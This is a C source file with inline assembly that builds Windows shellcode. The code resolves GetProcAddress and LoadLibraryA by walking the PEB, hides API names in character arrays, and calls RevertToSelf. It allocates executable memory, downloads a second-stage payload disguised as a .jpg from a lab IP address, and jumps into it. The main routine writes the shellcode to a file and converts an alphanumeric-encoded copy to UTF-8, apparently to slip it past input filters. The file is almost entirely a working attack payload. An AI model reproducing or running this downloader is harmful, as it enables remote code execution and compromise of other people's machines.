#include <stdio.h>
#include <Windows.h>
#include <wchar.h>
void findGetProAddrByPeb(DWORD flag);
void BreakPoint();
typedef FARPROC(WINAPI *FunGetProAddr)  (HMODULE h, LPCSTR name);
typedef HMODULE(WINAPI *FunGetLoadLirA) (LPCSTR name);
typedef UINT   (WINAPI *FunWinExec)     (LPCSTR lpCmdLine, UINT uCmdShow);
typedef void   (WINAPI *FunExitPro)     (UINT uExitCode);
typedef BOOL   (WINAPI *FunRevertToSelf)();
typedef void   (WINAPI *Funmemset)        (void *dest,int c,size_t count);
typedef LPVOID    (WINAPI *FunVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);
typedef void   (WINAPI *FunExitThread)(DWORD dwExitCode);
typedef int  (__cdecl *Funmalloc)(size_t size);

typedef int (WINAPI *FunInternetOpenA)(LPCSTR lpszAgent,DWORD  dwAccessType,LPCSTR lpszProxy,LPCSTR lpszProxyBypass,DWORD  dwFlags);
typedef int (WINAPI *FunInternetOpenUrlA)(int hInternet,LPCSTR lpszUrl,LPCSTR lpszHeaders,DWORD dwHeadersLength,DWORD dwFlags,DWORD_PTR dwContext);
typedef BOOL (WINAPI *FunInternetReadFile)(int hFile,LPVOID lpBuffer,DWORD dwNumberOfBytesToRead,LPDWORD lpdwNumberOfBytesRead);
typedef BOOL (WINAPI *FunWriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
void  shellcodeend()
{
	HMODULE        hKernel32;
	HMODULE        hAdvapi32;
	HMODULE        hWinInet;
//	HMODULE        hMsvcrt;

	int  internetopen;
	int  internetopenurl;
	BOOL internetreadfile;
	DWORD byteread;
	DWORD written;
	FunRevertToSelf      fRevertToSelf;
	FunGetProAddr        fGetProAddr;
	FunGetLoadLirA       fLoadLibraryA;
	FunVirtualAlloc      fVirAlloc;
	FunExitThread        fExitThread;
	FunInternetOpenA     fInternetOpenA;
	FunInternetOpenUrlA  fInternetOpenUrlA;
	FunInternetReadFile  fInternetReadFile;
	FunWriteFile         fWriteFile;

	char kerStr[]        = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };       // kernel32.dll
	char virAllocStr[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };                    // VirtualAlloc

    char winInetStr[]    = { 'W','i','n','I','n','e','t','.','d','l','l', 0 };                      // WinInet.dll
	char internetOpenAStr[]   = { 'I','n','t','e','r','n','e','t','O','p','e','n','A', 0 };              // InternetOpenA
	char internetOpenUrlAStr[]= { 'I','n','t','e','r','n','e','t','O','p','e','n','U','r','l','A', 0 };  // InternetOpenUrlA
	char internetReadFileStr[]= { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e', 0 };   //InternetReadFile
	
	char advaApi32Str[]  = { 'A','d','v','a','p','i','3','2','.','d','l','l', 0 };                // Advapi32.dll
	char rever2selfStr[] = { 'R','e','v','e','r','t','T','o','S','e','l','f', 0 };                // RevertToSelf
	
	char *shellBuffer;
	char testStr[] = { 't','e','s', 0 };
	char ip[] = { 'h','t','t','p',':','/','/','1','9','2','.','1','6','8','.','2','0','4','.','1','2','9', '/','s','c','.','j','p','g', 0 };// http://192.168.204.129/sc.jpg 
//	char msvcrtStr[]     = { 'm','s','v','c','r','t','.','d','l','l', 0 };       // msvcrt.dll
	
//	char memsetStr[]     = { 'm','e','m','s','e','t', 0 };                       // memset
//	char mallocStr[]     = { 'm','a','l','l','o','c', 0 };	                     // malloc
	
	
	__asm{ 
		push 2;
		call findGetProAddrByPeb;
		mov fGetProAddr, eax;      GetProAddress Address
		push 1;
		call findGetProAddrByPeb;
		mov fLoadLibraryA, eax;    LoadLibrary Addresss
	}

	hKernel32 = fLoadLibraryA(kerStr);
	hAdvapi32 = fLoadLibraryA(advaApi32Str);
//	hMsvcrt   = fLoadLibraryA(msvcrtStr);
	hWinInet  = fLoadLibraryA(winInetStr);
	
	fVirAlloc   = (FunVirtualAlloc)fGetProAddr(hKernel32,virAllocStr);
//	fWriteFile  = (FunWriteFile)fGetProAddr(hKernel32,writeFileStr);
	fRevertToSelf = (FunRevertToSelf)fGetProAddr(hAdvapi32, rever2selfStr);	
	fInternetOpenA = (FunInternetOpenA)fGetProAddr(hWinInet,internetOpenAStr);
	fInternetOpenUrlA = (FunInternetOpenUrlA)fGetProAddr(hWinInet,internetOpenUrlAStr);
	fInternetReadFile = (FunInternetReadFile)fGetProAddr(hWinInet,internetReadFileStr);

	fRevertToSelf();
	shellBuffer = fVirAlloc(NULL,0x2000,MEM_COMMIT,0x40);
	internetopen = fInternetOpenA(testStr,0,NULL,NULL,0);
	internetopenurl=fInternetOpenUrlA(internetopen,ip,NULL,0,0x04000000,0);
	internetreadfile=fInternetReadFile(internetopenurl,shellBuffer,0x2000,&byteread);
	__asm{
		mov eax,shellBuffer;
		call eax;
	}

}
void __declspec(naked) findGetProAddrByPeb(DWORD flag)
{
	__asm{
		push ebp;
		mov ebp, [esp+8];
		push ebx;
		push edi;
		push esi;
		xor eax, eax;
		mov eax, fs:[0x30];    Pointer to PEB
		mov eax, [eax + 0xc];  Pointer to Ldr
		mov eax, [eax + 0x1c]; Pointer to InInitializationOrderLinks
	next_mod:
		mov esi, [eax + 0x8];  Poniter to DllBase
		mov edi, [eax + 0x20]; Poniter to BaseDllName
		mov eax, [eax];		   Poniter to next module InInitializationOrderLinks
		xor ebx, ebx;
	add_kerstr:
		cmp dword ptr[edi + 0xc], 0x00320033; add module name
		jne next_mod;

		cmp word ptr[edi + 0x10], 0x002e;
		jne next_mod;
	_found:
		mov edi, esi;                get kernel32.dll address
	_findGetProcAddr:
		mov eax, [edi + 0x3c];       PE Header offset
		mov edx, [edi + eax + 0x78]; Exports table offset
		add edx, edi;
		mov ecx, [edx + 0x18];       number of functions
		mov ebx, [edx + 0x20];       offset of Function Name
		add ebx, edi;
	search:
		dec ecx;
		mov esi, [ebx + ecx * 4];
		add esi, edi;
		mov eax, 0x50746547;         PteG("GetP")
		cmp[esi], eax;
		jnz search;
		mov eax, 0x41636f72;         Acor("rocA")
		cmp[esi + 4], eax;
		jnz search;
		mov ebx, [edx + 0x24];       offset of Function Address
		add ebx, edi;			     index  of Function address
		mov cx, [ebx + ecx * 2];     function index
		mov ebx, [edx + 0x1c];     
		add ebx, edi;
		mov eax, [ebx + ecx * 4];
		add eax, edi;
		mov ebx, eax;                GetProcAddress -> ebx 
		
	_getLoadLibraryA:
		push 0;
		push 0x41797261; Ayra("aryA");
		push 0x7262694c; rbiL("Libr");
		push 0x64616f4c; daoL("Load");
		push esp;
		push edi;
		call ebx;        eax = LoadLibrary
		pop ecx;
		pop ecx;
		pop ecx;
		pop ecx;
		cmp ebp, 1;
		jnz _ret2;
		pop esi;
		pop edi;
		pop ebx;
		pop ebp;
		ret 4;           ret LoadLibrary Address
	_ret2:
		mov eax, ebx;    flag = 2
		pop esi;
		pop edi;
		pop ebx;
		pop ebp;
		ret 4;           ret GetProcessAddress 
	}
}

int main()
{
	DWORD    dSize;
	DWORD    dWrite;
	DWORD    dwErr;
	HANDLE   hFile;
	HANDLE   hRead;
	HANDLE   hWrite;
	wchar_t  dBuf[0x4000];
	wchar_t  uBuf[0x4000];
	char     chBuffer[0x4000];
	int      wLen ;

	dWrite = 0;
	memset(dBuf,0,0x4000);
	memset(uBuf,0,0x4000);
	memset(chBuffer,0,sizeof(chBuffer));
	printf("findGetProAddrByPeb :%p\n", findGetProAddrByPeb);
	printf("shellcodeend :%p\n", shellcodeend);
	dSize = (DWORD)main - (DWORD)shellcodeend;
	printf("main-findGetProAddrByPeb = %x\n", dSize);

	hFile = CreateFileA("sc.bin",GENERIC_ALL,0,NULL,CREATE_ALWAYS,0,NULL);
	if(!hFile){
		printf("Create File Error..\n");
		return 1;
	}
	WriteFile(hFile,shellcodeend,dSize,&dWrite,NULL);
	CloseHandle(hFile);

	/* Alpha shellcode to utf-8
	** The first step is covert  my shellcode to an alpha shellcode .
	** then , convert the Alpha shellcode to Utf-8
	*/
	hRead = CreateFileA("alphasc.bin",GENERIC_READ,0,NULL,OPEN_EXISTING ,0,NULL);
	if(!hRead){
		printf(" alphasc.bin : CreateFileA  File Error..\n");
		return 1;
	}
	dSize = GetFileSize(hRead,NULL);
	if(!ReadFile(hRead, chBuffer, dSize, &dSize, NULL)){
		printf("alphasc.bin : Read File Content Error..\n");
		return 1;
	}
	printf("chBuffer = %p \n",chBuffer);


	wLen = WideCharToMultiByte(CP_UTF8, 0, chBuffer, dSize, NULL, 0,NULL,NULL);
	printf("length = %d \n",wLen);
	
	if(!WideCharToMultiByte(CP_UTF8, 0, chBuffer, dSize, &dBuf, wLen,NULL,NULL)){
		printf("WideCharToMultiByte Error..\n");
		return 1;
	}
	printf("dBuf = %p \n",dBuf);

	hFile = CreateFileA("utf8-2.bin",GENERIC_ALL,0,NULL,CREATE_ALWAYS,0,NULL);
	if(!hFile){
		printf("utf8-2.bin : Create File Error..\n");
		return 1;
	}
	WriteFile(hFile,dBuf,wLen,&dWrite,NULL);
	CloseHandle(hFile);
	//BreakPoint();
	shellcodeend();
	return 0; 
}
void BreakPoint()
{
	_asm{
		int 3;
	}
}